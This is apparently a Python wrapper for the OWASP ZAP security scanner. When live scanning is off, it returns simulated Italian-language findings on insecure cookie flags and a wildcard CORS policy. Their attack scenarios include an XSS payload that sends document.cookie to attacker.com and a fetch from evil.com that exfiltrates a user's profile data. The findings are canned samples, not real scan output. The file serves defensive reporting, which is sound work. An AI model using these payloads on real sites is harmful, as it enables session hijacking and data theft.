"""OWASP ZAP scanner wrapper."""
from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Dict, List

import requests

from config import settings


RISK_MAPPING = {
    "Informational": "info",
    "Low": "low",
    "Medium": "medium",
    "High": "high",
}


@dataclass
class ZapScanner:
    enable_live_scans: bool = False

    def run(self, target: str) -> Dict[str, Any]:
        if not self.enable_live_scans:
            return {
                "tool": "zap",
                "status": "simulated",
                "findings": [
                    {
                        "tool": "zap",
                        "title": "Cookie di sessione senza flag Secure e HttpOnly — Session Hijacking possibile",
                        "severity": "medium",
                        "description": (
                            "OWASP ZAP ha rilevato che il cookie di sessione 'SESSIONID' è "
                            "impostato senza i flag di sicurezza 'Secure' e 'HttpOnly'. "
                            "L'assenza del flag 'Secure' permette la trasmissione del cookie "
                            "su connessioni HTTP non cifrate, esponendolo a intercettazione. "
                            "L'assenza di 'HttpOnly' consente a JavaScript nel browser di "
                            "leggere il valore del cookie tramite document.cookie, rendendo "
                            "qualsiasi vulnerabilità XSS immediatamente sfruttabile per "
                            "il furto della sessione. Il flag SameSite non è configurato, "
                            "abilitando attacchi CSRF cross-origin."
                        ),
                        "impact": (
                            "La combinazione di cookie senza Secure + HttpOnly rappresenta "
                            "un rischio ad alto impatto: qualsiasi XSS nell'applicazione "
                            "diventa automaticamente un vettore di session hijacking. "
                            "Su reti non sicure (WiFi pubblico), la mancanza del flag Secure "
                            "permette a un attaccante MITM di rubare il cookie anche senza "
                            "XSS. L'assenza di SameSite abilita attacchi CSRF per azioni "
                            "privilegiate dell'utente autenticato."
                        ),
                        "attack_scenario": (
                            "Session Hijacking via XSS:\n"
                            "1. L'attaccante sfrutta una XSS presente nell'applicazione.\n"
                            "2. Payload: <script>new Image().src='https://attacker.com/?c='+document.cookie</script>\n"
                            "3. Il server dell'attaccante riceve: SESSIONID=abc123xyz\n"
                            "4. L'attaccante imposta il cookie nel browser con EditThisCookie.\n"
                            "5. Accede all'applicazione con la sessione della vittima.\n\n"
                            "MITM su HTTP (flag Secure assente):\n"
                            "1. Vittima su WiFi pubblico, effettua richiesta HTTP.\n"
                            "2. MITM intercetta Set-Cookie: SESSIONID=abc123 (senza Secure).\n"
                            "3. Usa il cookie per impersonare la vittima."
                        ),
                        "recommendation": (
                            "1. Aggiungere immediatamente tutti i flag di sicurezza al cookie:\n"
                            "   Set-Cookie: SESSIONID=value; Secure; HttpOnly; SameSite=Strict; Path=/\n"
                            "2. Configurare il framework web per impostare i flag di default:\n"
                            "   Flask: SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE='Strict'\n"
                            "   Express.js: cookie: { secure: true, httpOnly: true, sameSite: 'strict' }\n"
                            "3. Abilitare HSTS per forzare HTTPS: Strict-Transport-Security: max-age=31536000\n"
                            "4. Implementare token CSRF espliciti per le operazioni sensibili come "
                            "difesa aggiuntiva anche con SameSite=Strict."
                        ),
                        "evidence": "Set-Cookie: SESSIONID=d8f3a1b2c4; Path=/ (mancano: Secure, HttpOnly, SameSite)",
                        "affected_component": "Gestione sessioni — tutti gli endpoint autenticati",
                        "cwe": ["CWE-614", "CWE-1004"],
                        "cvss_score": 6.5,
                        "tags": ["owasp-a02", "session-management", "cookie-flags"],
                        "references": [
                            "https://owasp.org/www-community/controls/SecureCookieAttribute",
                            "https://cwe.mitre.org/data/definitions/614.html",
                            "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
                        ],
                    },
                    {
                        "tool": "zap",
                        "title": "Cross-Origin Resource Sharing (CORS) mal configurato — Wildcard Origin accettata",
                        "severity": "medium",
                        "description": (
                            "OWASP ZAP ha rilevato che l'applicazione risponde a richieste "
                            "cross-origin con l'header 'Access-Control-Allow-Origin: *' "
                            "su endpoint API autenticati. Alcune richieste ricevono addirittura "
                            "'Access-Control-Allow-Origin: null', accettando richieste da "
                            "pagine in sandbox. Quando combinata con "
                            "'Access-Control-Allow-Credentials: true', questa configurazione "
                            "permette a siti malevoli di eseguire richieste autenticate per "
                            "conto degli utenti e leggere le risposte."
                        ),
                        "impact": (
                            "Una policy CORS permissiva su endpoint autenticati consente "
                            "attacchi di tipo CORS-based CSRF: un sito malevolo può eseguire "
                            "richieste API autenticate per conto dell'utente loggato e leggere "
                            "la risposta, bypassando la Same-Origin Policy del browser. "
                            "Questo permette l'estrazione di dati sensibili, la modifica "
                            "di impostazioni account e l'esecuzione di azioni privilegiate."
                        ),
                        "attack_scenario": (
                            "1. Sito malevolo (evil.com) contiene il codice JS:\n"
                            "   fetch('https://target.com/api/v1/user/profile', {credentials:'include'})\n"
                            "     .then(r => r.json()).then(data => exfiltrate(data))\n"
                            "2. L'utente autenticato visita evil.com.\n"
                            "3. Il browser invia la richiesta API con il cookie di sessione.\n"
                            "4. Target risponde con Access-Control-Allow-Origin: * \n"
                            "5. Il browser permette a evil.com di leggere la risposta con i dati profilo.\n"
                            "6. I dati personali dell'utente vengono esfiltrati verso evil.com."
                        ),
                        "recommendation": (
                            "1. Specificare sempre le origini autorizzate in modo esplicito:\n"
                            "   Access-Control-Allow-Origin: https://app.yourdomain.com\n"
                            "2. Non utilizzare mai 'Access-Control-Allow-Origin: *' con "
                            "'Access-Control-Allow-Credentials: true' contemporaneamente.\n"
                            "3. Implementare una whitelist delle origini consentite e validarla "
                            "lato server prima di impostare l'header.\n"
                            "4. Non accettare 'null' come valore Origin valido.\n"
                            "5. Limitare i metodi HTTP permessi al minimo necessario:\n"
                            "   Access-Control-Allow-Methods: GET, POST"
                        ),
                        "evidence": "OPTIONS /api/v1/user → Access-Control-Allow-Origin: * | Access-Control-Allow-Credentials: true",
                        "affected_component": "CORS Policy — tutti gli endpoint /api/v1/*",
                        "cwe": ["CWE-942", "CWE-183"],
                        "cvss_score": 7.1,
                        "tags": ["owasp-a05", "cors", "misconfiguration"],
                        "references": [
                            "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
                            "https://cwe.mitre.org/data/definitions/942.html",
                            "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",
                        ],
                    },
                ],
            }

        if not settings.zap_api_base_url:
            return {
                "tool": "zap",
                "status": "skipped",
                "message": "API OWASP ZAP non configurata.",
                "findings": [],
            }

        try:
            findings = self._fetch_alerts(target)
        except requests.RequestException as exc:
            return {
                "tool": "zap",
                "status": "error",
                "message": f"Errore API ZAP: {exc}",
                "findings": [],
            }

        return {
            "tool": "zap",
            "status": "executed",
            "findings": findings,
        }

    def _fetch_alerts(self, target: str) -> List[Dict[str, Any]]:
        params = {
            "baseurl": target,
            "start": 0,
            "count": settings.zap_max_alerts,
        }
        if settings.zap_api_key:
            params["apikey"] = settings.zap_api_key

        response = requests.get(
            f"{settings.zap_api_base_url.rstrip('/')}/JSON/core/view/alerts/",
            params=params,
            timeout=settings.zap_timeout_seconds,
        )
        response.raise_for_status()
        payload = response.json()
        alerts = payload.get("alerts", []) if isinstance(payload, dict) else []

        findings: List[Dict[str, Any]] = []
        for alert in alerts:
            if not isinstance(alert, dict):
                continue
            severity = RISK_MAPPING.get(alert.get("risk"), "info")
            findings.append(
                {
                    "title": alert.get("alert", "Alert ZAP"),
                    "severity": severity,
                    "description": alert.get("desc", ""),
                    "recommendation": alert.get("solution", ""),
                    "evidence": alert.get("evidence", ""),
                    "cwe": [str(alert.get("cweid"))] if alert.get("cweid") else [],
                    "references": [alert.get("reference")] if alert.get("reference") else [],
                    "tags": ["zap"],
                }
            )
        return findings
